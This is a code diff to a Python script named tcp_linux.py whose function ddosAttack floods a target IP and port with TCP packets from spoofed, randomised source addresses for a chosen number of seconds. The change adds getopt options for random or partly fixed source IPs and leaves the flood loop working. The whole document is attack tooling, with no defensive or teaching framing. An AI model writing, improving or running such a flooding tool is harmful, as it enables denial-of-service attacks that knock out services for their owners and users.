@@ -139,8 +139,22 @@ def genRadomIp(ip):
         ip = str(ip)
     return ip
 
-def ddosAttack():
-    tcp = TCP_packet(dest_ip=sys.argv[2], dest_port= int(sys.argv[3]))
+def ddosAttack(argv):
+    try:
+        opts, args = getopt.getopt(argv,"rs:",["random=,specific="])
+    except getopt.GetoptError:
+        print('tcp_linux.py -r <SourceIp> <SourcePort>')
+        print('tcp_linux.py -s <Specific Ip 3byte> <SourceIp> <SourcePort>')
+        sys.exit(2)
+
+    for opt, arg in opts:
+        if opt == '-r':
+            specIp = ['-1','-1','-1']
+        if opt == '-s':
+            specIp = str(arg).split(".")
+    
+    
+    tcp = TCP_packet(dest_ip=args[0], dest_port= int(args[1]))
     end = input('How much seconds do you want?')
     start = time.time()
     end = start + float(end)
@@ -151,14 +165,11 @@ def ddosAttack():
     while True:
         if time.time() > end:
             break
-        if sys.argv[1] == '-r':
-            tcp.random_source(169, 234, 2, -1)
-        else :
-            tcp.random_source(169, 234, 2, 161)
+        tcp.random_source(int(specIp[0]), int(specIp[1]), int(specIp[2]), -1)
         tcp.send_socket()
         count += 1
     print(str(count) + " packets are sent")
 
 
 if __name__ == "__main__":
-    ddosAttack()
+    ddosAttack(sys.argv[1:])
